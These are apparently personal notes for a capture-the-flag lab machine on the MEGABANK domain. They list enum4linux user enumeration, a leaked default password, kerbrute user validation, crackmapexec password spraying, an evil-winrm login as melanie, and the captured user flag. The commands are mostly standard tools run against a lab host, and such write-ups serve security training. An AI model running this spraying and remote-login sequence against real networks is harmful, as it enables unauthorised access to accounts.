```
enum4linux -a 10.10.10.169
```

```
Domain Name: MEGABANK                                                         
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
```

We got the userlist as well as Password
![[Pasted image 20240506055923.png]]

User
```
marko
```

Password
```
Welcome123!
```


```
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

Let's check if the users are valid with kerbrute and 24 are valid out of 27 
```
kerbrute userenum -d megabank.local --dc 10.10.10.169 Valid_user.txt -t 100
```
![[Pasted image 20240506060316.png]]


Password Policy
![[Pasted image 20240506060741.png]]


Let's see who uses the default password 
```
crackmapexec smb 10.10.10.169 -u Valid_user.txt -p Welcome123!
```
![[Pasted image 20240506061134.png]]
user: melanie uses the default password

```
evil-winrm -u melanie -p 'Welcome123!' -i 10.10.10.169
```
![[Pasted image 20240506061412.png]]
User Flag
```
2381d46ef2566c000d1184a57ca5f5f4
```

